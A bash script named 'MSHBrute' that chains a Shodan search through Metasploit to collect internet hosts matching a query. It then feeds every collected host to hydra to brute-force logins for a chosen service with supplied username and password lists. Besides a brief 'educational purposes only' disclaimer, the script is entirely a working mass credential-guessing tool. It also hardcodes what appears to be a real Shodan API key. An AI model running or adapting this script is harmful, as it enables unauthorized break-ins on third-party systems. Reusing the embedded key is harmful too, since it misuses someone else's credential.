#!/bin/bash 



### Global variables ### 

var=$1
args=$#
service=$6
pass_file=$5
user_file=$4
QUERY=$2
WORKSPACE=$3
API=$1
PATHTOFILE=/tmp/resource.rc 
CHECK=$(service postgresql status | grep active | cut -d ":" -f 2)
OUTPUT=hostsPerLine.txt
GREEN="\033[32m"
NC="\033[0m"
RED="\033[31m"
YELLOW="\033[33m"
phase1="========================= PHASE  FINISHED ========================="


_inputValidation()

{
		if test $args -lt 6 ;
		then
			if [[ $var == -h ]] ; 
			then 
				echo
				echo -e "$GREEN Usage $NC: <API> <QUERY> <Workspace> <usernames> <passwords> <service>"
				echo 
				exit 1 
		else 
			echo -e "$RED[!]$NC Invalid parameters supplied "
			echo
			
			echo -e "$RED[!]$NC Quiting"
			echo
			echo -e "$GREEN Usage $NC: <API> <QUERY> <Workspace> <usernames> <passwords> <service>"
			echo
			sleep 2 
			echo
			exit 1		
					
			fi	
		fi 	
	
}

_banner() 

{

		echo
		echo -e " +--------------------------------------+"
		echo -e " +       MSHBrute                      +"
		echo -e " + 		$RED Author $NC:$GREEN R@mi@hmed $NC    +"
		echo -e " +--------------------------------------+"
		echo
		
		echo -e "$RED[!] Disclaimer$NC: For Educational Purposes only , Do not abuse other's systems. "
		echo
		echo 
		echo


}

_nextPhase() 

{

		echo 
		echo $phase1
		echo

}


_CreateResourceFile()

{
	
		echo "

		workspace -a $WORKSPACE
		workspace $WORKSPACE
		use auxiliary/gather/shodan_search 
		set verbose true 
		set database true 
		set shodan_apikey  kIWGHFKiwPXAxAllHzsKM8JXuvao6Ul5
		set query $QUERY 
		db_export -f xml $WORKSPACE.xml
		run 
		hosts -o $WORKSPACE.csv
		exit


		" > $PATHTOFILE
	
}







_CheckPostgresql()

{
		## Enabling regex 
	
		shopt -s extglob

		if [[ ${CHECK} =~ (in)active    ]]  ; 
		then 
			echo -e "$RED[!]$NC service postgresql down  "
			echo -e "$YELLOW[+]$NC starting postgresql "
			service postgresql start 
			if [[ `service postgresql status | grep active | cut -d " " -f 6 | sed 's/(//g' | sed 's/)//g'` =~ exited ]] ;
			then
				echo -e "$GREEN[+]$NC started successfully "
			else
				
				echo -e "$RED[!]$NC couldn't start postgresql , quiting !!"
				exit 1
			fi
			
		fi


}




_StartMetasploit()

{


		msfconsole -q -x " resource $PATHTOFILE "
	
}



_CSVParser()

 {


		echo -e "$GREEN[+]$NC Generating a hosts per line file"
		sleep 3
		cat $WORKSPACE.csv | cut -d , -f 1 | awk '{ if (NR !=1 )  {print}}' | sed 's/"//g' > $OUTPUT
		echo -e "$GREEN[+]$NC Done !!"
	
}


_bruteforce()

{

		
	 	hydra -V -L $user_file  -P $pass_file   -M $OUTPUT $service 

}


_bruteforceInfo() 

{

		echo -e "$GREEN[+]$NC bruteforce attack against [ $RED$service$NC ] service started using: \n \n usernames    ==>  [ $(echo "$user_file" | sed "s/.*\///") ]  \n passwords    ==>  [ $(echo "$pass_file" | sed "s/.*\///") ] \n Total hosts  ==>  [ $(cat $OUTPUT | wc -l ) ]"
		echo 
		echo 
		echo -e "Are you sure you want to carry on ? (y/n) : \c "
		read ANSWER
		if [[ $ANSWER == 'y' ]]  || [[ $ANSWER == 'Y' ]] ; 
		then 
			echo 
			echo -e "$GREEN[+]$NC  BruteForcing , this may take a while  !!! "
			echo 
		else 
			echo
			echo -e "$RED[!]$NC Quiting"
			sleep 2 
			echo
			exit 1 

		fi

}

_testConfirmation() 

{



		echo 
		echo -e "$YELLOW[+]$NC Creating resource files using the following configurations" :
		echo 
		echo " ****************************************************************"
		echo " *      							*"
		echo -e " *   $GREEN API $NC ==>  $API  	        *"
		echo -e " *   $GREEN Query $NC ==>  $QUERY 	              		*"
		echo -e " *   $GREEN WORKSPACE $NC ==>  $WORKSPACE   	              	        *"
		echo -e " *   $GREEN USERNAMES $NC ==>  $(echo "$user_file" | sed "s/.*\///")   		*"
		echo -e " *   $GREEN PASSWORDS $NC ==>  $(echo "$pass_file" | sed "s/.*\///") 	*"
		echo -e " *      							* "
		echo " ****************************************************************"
		echo 

		echo 
		echo -e "Do you wish to continue (Y/N) : \c "
		read  ANSWER 

		if [[ $ANSWER == 'y' ]]  || [[ $ANSWER == 'Y' ]] ; 
		then 
			echo 
			echo -e "$GREEN[+]$NC  OK then , Resuming !!! "
			echo 
		else 
			echo
			echo -e "$RED[!]$NC Quiting"
			sleep 2 
			echo
			exit 1 

		fi


}





_banner
_inputValidation
_testConfirmation
_CreateResourceFile 
echo -e "$GREEN[+]$NC configurations created successfully ==> /tmp/resource.rc"
echo 
sleep 5
echo $phase1
echo 
echo -e "$YELLOW[+]$NC Checking metasploit Configurations"
_CheckPostgresql
echo -e "$GREEN[+]$NC You'are all set , Starting metasploit !! "
sleep 2
_nextPhase
_StartMetasploit
_nextPhase
sleep 3 
_CSVParser
_nextPhase
_bruteforceInfo
_bruteforce 






